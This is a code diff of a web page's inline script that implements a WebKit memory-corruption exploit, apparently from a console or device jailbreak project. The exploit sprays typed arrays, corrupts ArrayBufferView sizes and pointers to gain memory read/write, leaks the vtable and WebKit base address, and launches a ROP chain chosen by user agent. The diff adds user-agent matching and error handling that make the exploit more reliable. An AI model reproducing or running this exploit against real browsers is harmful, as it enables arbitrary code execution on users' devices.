@@ -7,6 +7,18 @@
 <script src="/scripts/gadgets.js"></script>
 
 <script>
+try {
+    var ua = window.navigator.userAgent;
+    var supportedUAs = Object.getOwnPropertyNames(gadgetMap);
+    for(var i = 0; i < supportedUAs.length; i++) 
+      if(ua.indexOf(supportedUAs[i]) != -1) {
+          gadgets = gadgetMap[supportedUAs[i]];
+      }
+    if(typeof(gadgets) === "undefined") {
+        throw "Your system is not supported.";
+    }
+    
+    debug_log("\r\nEntering exploit\r\n");
     var spray = new Array(0x1000)
     for (var i = 0; i < spray.length; i++) {
         spray[i] = new Uint32Array(0x1A7)
@@ -25,6 +37,7 @@
     var rop_buf = undefined;
     var rop_buf_addr = undefined;
     var storage = new Storage();
+    var found = false;
 
     o.toString = function() {
         foo.push(12345);
@@ -70,11 +83,16 @@
     for (var i = 48; i < 60; i++) {
         var val = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * i) - offset / 2 - 1]).hi
         if (val == 0xbadaeef7) {
+            found = true;
             debug_log("Found ArrayBufferView in memory!")
             debug_log('Modified index is ' + i)
             index = i;
             break
         }
+    }
+    
+    if(!found) {
+      throw "Did not find ArrayBufferView in memory.";
     }
 
     // Modify an ArrayBufferView object size,
@@ -82,11 +100,13 @@
     arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
     arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 2] = arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 4]
 
+    found = false;
     for (var i = 0; i < u32buffer.length; i++) {
         if (u32buffer[i].length != 0x13AC) {
             // Modify the ArrayBuffer so it is larger
             // and make it so it's m_data pointer points to the ArrayBufferViews
             debug_log("Found modified ArrayBufferView!")
+            found = true
             buf_addr = new dcodeIO.Long(u32buffer[i][2], u32buffer[i][3], true)
             u32buffer[i][4] = (0x60000 * 4)
             u32buffer[i][2] = u32buffer[i][6]
@@ -94,14 +114,24 @@
             break;
         }
     }
+    
+    if(!found) {
+      throw "Did not find ArrayBufferView in memory.";
+    }
 
+    found = false;
     // Find the modified ArrayBuffer and create our own Uint32Array from it
     for (var i = 0; i < u32buffer[i].length; i++) {
         if (u32buffer[i].buffer.byteLength != 0x4eb0) {
+            found = true;
             debug_log("Found modified ArrayBuffer!")
             cbuf = new Uint32Array(u32buffer[i].buffer)
             break;
         }
+    }
+    
+    if(!found) {
+      throw "Did not find ArrayBufferView in memory.";
     }
 
     vtable_ptr = new dcodeIO.Long(cbuf[0], cbuf[1], true);
@@ -109,13 +139,18 @@
         // Change the buffer size of the next ArrayBufferView in memory
     cbuf[0x1e] = 0x600000
 
-
+    found = false;
     // Find it, we will use it for ROP
     for (var i = 0; i < u32buffer[i].length; i++) {
         if (u32buffer[i].length == 0x600000) {
+            found = true;
             rop_buf = u32buffer[i]
             break;
         }
+    }
+    
+    if(!found) {
+      throw "Did not find ArrayBufferView in memory.";
     }
 
     // Basically the way the memory will be used is:
@@ -136,6 +171,7 @@
     debug_log("vtable = 0x" + vtable_ptr.toString(16))
     debug_log("webkit_base_addr = 0x" + webkit_base_addr.toString(16))
     debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
+    
     debug_log("Starting ROP...")
 
     debug_log('Printing module information...')
@@ -172,4 +208,8 @@
     storage.free(str_to_write.length)
 
     debug_log("DONE!")
+} catch (ex) {
+    document.write("<h1>Error: "+ex+"</h1>");
+    debug_log("!! ERROR: "+ex);
+}
 </script>
